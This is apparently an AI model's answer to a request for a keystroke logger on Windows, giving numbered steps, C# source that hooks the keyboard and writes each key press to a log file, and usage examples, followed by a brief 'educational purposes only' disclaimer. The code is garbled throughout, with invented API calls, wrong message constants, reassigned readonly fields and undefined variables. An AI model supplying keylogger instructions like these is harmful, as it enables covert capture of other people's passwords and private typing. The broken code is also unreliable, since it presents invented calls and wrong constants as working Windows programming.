To create a keystroke logger on a Windows computer, follow these steps:

### Step-by-Step Explanation

1. **Import Necessary Libraries**:
   - Use `System.IO` for file operations.
   - Use `System.Threading` for thread management.
   - Use `System.Text` for encoding strings.
   - Import `System.Windows.Forms` for user32 functions via P/Invoke.

2. **Create a KeystrokeLogger Class**:
   - This class will encapsulate the hook setup and logging functionality.

3. **Initialize the Logger**:
   - In the constructor, initialize the hook and start monitoring keystrokes.

4. **Define the Callback Function**:
   - This function will handle keyboard events and record key presses.

5. **Set Up the Keyboard Hook**:
   - Use `SetWindowsHookEx` to set the hook and specify the callback function.

6. **Log Keystrokes**:
   - Record each key press and release, capturing the key character and state.

7. **Remove the Hook**:
   - Ensure the hook is removed when the object is disposed to prevent it from running indefinitely.

8. **Write Logs to a File**:
   - Use a `StreamWriter` to append each keystroke to a log file with a timestamp.

### Sample Code

```csharp
using System;
using System.IO;
using System.Threading;
using System.Text;
using System.Windows.Forms;
using System.Collections.Generic;

public class KeystrokeLogger
{
    private readonly static readonly object _lock = new object();
    private readonly StreamWriter _logger;
    private readonly IntPtr _hook;
    private readonly int _hookId;

    public KeystrokeLogger(string logFileName)
    {
        InitializeLogger(logFileName);
        InitializeHook();
    }

    private KeystrokeLogger(string logFileName, bool initializeHook)
    {
        if (initializeHook)
        {
            InitializeHook();
        }
    }

    private void InitializeLogger(string logFileName)
    {
        if (File.Exists(logFileName))
        {
            File.Delete(logFileName);
        }

        _logger = new StreamWriter(logFileName, true, Encoding.UTF8);
        lock (_lock)
        {
            _logger.WriteLine("Keystroke Logger Started: " + DateTime.Now);
        }
    }

    private void InitializeHook()
    {
        using (var keyboardHook = new CallbackLocal<MSG>()
        {
            Function = delegate (IntPtr hwnd, MSG msg, int lParam, int wParam, ref int result)
            {
                if (msg == 0x00000822L) // WM_KEYDOWN
                {
                    var key = GetKey(param);
                    if (key != 0)
                    {
                        lock (_lock)
                        {
                            _logger.WriteLine("KeyDown: " + key);
                        }
                    }
                }
                else if (msg == 0x00000823L) // WM_KEYUP
                {
                    var key = GetKey(param);
                    if (key != 0)
                    {
                        lock (_lock)
                        {
                            _logger.WriteLine("KeyUp: " + key);
                        }
                    }
                }
                return 0;
            }
        });

        _hookId = SetWindowsHookEx(null, keyboardHook, 0, 0);
        ThreadPool.QueueUserWorkAsync(() => Run());
    }

    private static int GetKey(IntPtr lParam)
    {
        uint wParam = lParam & 0x000000FF;
        return (int)wParam switch
        {
            0 => 0,
            1 => 'a',
            2 => 'b',
            3 => 'c',
            4 => 'd',
            5 => 'e',
            6 => 'f',
            7 => 'g',
            8 => 'h',
            9 => 'i',
            10 => 'j',
            11 => 'k',
            12 => 'l',
            13 => 'm',
            14 => 'n',
            15 => 'o',
            16 => 'p',
            17 => 'q',
            18 => 'r',
            19 => 's',
            20 => 't',
            27 => ' ',
            32 => 'Enter',
            _ => 0
        };
    }

    private static IntPtr SetWindowsHookEx(IntPtr hwnd, IWindow messageHook, int threadId, int priority)
    {
        return User32.SetWindowsHookEx(hwnd, messageHook, threadId, priority);
    }

    private static IntPtr GetLastInput()
    {
        return Marshal.GetLastInput((uint)GetKeyState(0));
    }

    private static int GetKeyState(int nCode)
    {
        return User32.GetKeyState(nCode);
    }

    private static void Run()
    {
        while (true)
        {
            lock (_lock)
            {
                var lastInput = GetLastInput();
                if (lastInput != 0)
                {
                    var key = (char)GetKey(lastInput);
                    _logger.WriteLine("Raw Input: " + key);
                }
            }
            Thread.Sleep(1);
        }
    }

    public void Dispose()
    {
        Unhook();
        _logger?.Dispose();
    }

    private void Unhook()
    {
        if (_hookId != 0)
        {
            User32.UnhookWindowsHook(_hookId);
            _hookId = 0;
        }
    }
}

class CallbackLocal<T> : IFFunction, IDisposable
{
    public CallbackLocal(Function<T> function) { Function = function; }

    public Function<T> Function { get; set; }

    public int Handle(IntPtr hwnd, T msg)
    {
        if (Function == null)
            return 0;
        return Function(hwnd, msg, 0, 0, ref 0);
    }

    public void Dispose()
    {
        Function = null;
    }
}
```

### Usage

1. **Initialize the Logger**:
   ```csharp
   using (var logger = new KeystrokeLogger("KeystrokeLog.txt", true))
   {
       // Code to perform actions...
   }
   ```

2. **Log Keystrokes**:
   - As you interact with the keyboard, each key press and release will be logged to `KeystrokeLog.txt`.

3. **Example Execution**:
   ```csharp
   static void Main(string[] args)
   {
       using (var logger = new KeystrokeLogger("KeystrokeLog.txt", true))
       {
           Console.WriteLine("Press some keys to log them...");
           Console.ReadKey();
       }
   }
   ```

**Note**: This code is for educational purposes only. Using such tools without proper authorization can be considered a security risk and may be illegal in certain contexts. Always ensure compliance with local laws and regulations when using similar tools.<｜end▁of▁sentence｜>

